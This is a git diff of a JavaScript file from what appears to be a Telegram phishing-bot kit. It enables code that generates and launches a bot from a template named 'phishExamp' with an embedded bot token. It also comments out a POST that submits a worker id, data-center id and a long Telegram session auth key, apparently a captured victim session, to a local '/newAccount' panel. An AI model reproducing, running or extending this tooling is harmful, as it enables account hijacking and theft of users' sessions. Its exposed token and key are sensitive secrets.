@@ -1,7 +1,3 @@
-/*
-
-Create bot by code
-
 const createConfig = require("./botCreatingTools/createConfig");
 const createBot = require("./botCreatingTools/createBot");
 const cmdWorking = require("./botCreatingTools/cmdWorking");
@@ -15,12 +11,9 @@ const config = createConfig("5722806586:AAFhIoDynQz_OcjCzYKN2M_KHkqFOFJv2no","54
 createBot(config, path, "./phishExamp");
 cmdWorking(`cd ${path} & python bot.py`);
 
- */
-
+/*
 const axios = require("axios");
 const config = require("./config");
-
-/*
 
 function sleep(ms) {
     return new Promise((resolve) => {
@@ -78,6 +71,6 @@ const checkUpdates = new Promise(async (reslove, reject) => {
     }
 })
 
- */
-
 axios.post("http://localhost:5000/newAccount", {worker_id: "5409656596", dc_id: "4", auth_key: "ac2dc80d4192b4fe26b3e98a640abe57ff5c00eec57a708869aa1f5d87305ccd2c9d93e28b16a820afb375191fc0c474e49f3aa626e472093b846610f47ff159d78609ca2df2ee4138d9b24a93bdd57636450251b001df6edc9a0840269d95028d54bb5489c691c3359f202784d31bef41aeb0dc83f10a3a81f544809ecec7f6def5c76512d682fe4cfea59d5ecae39dd7d346c3cd1a8ff3e77b98b1ba0f53d5a11bb16178ee7cf1b22942fb78226365389cf84ef64e5273bf10f3799cbc8c6b4595747a1d72b2e90ab0be63daa9ead72d067eb872ed2b0aa5cad3a7c364336cb7f02d58fb2cdd3c6cb57519d5cd571eb079c605814dfcb1fb17056c59961240"})
+
+*/
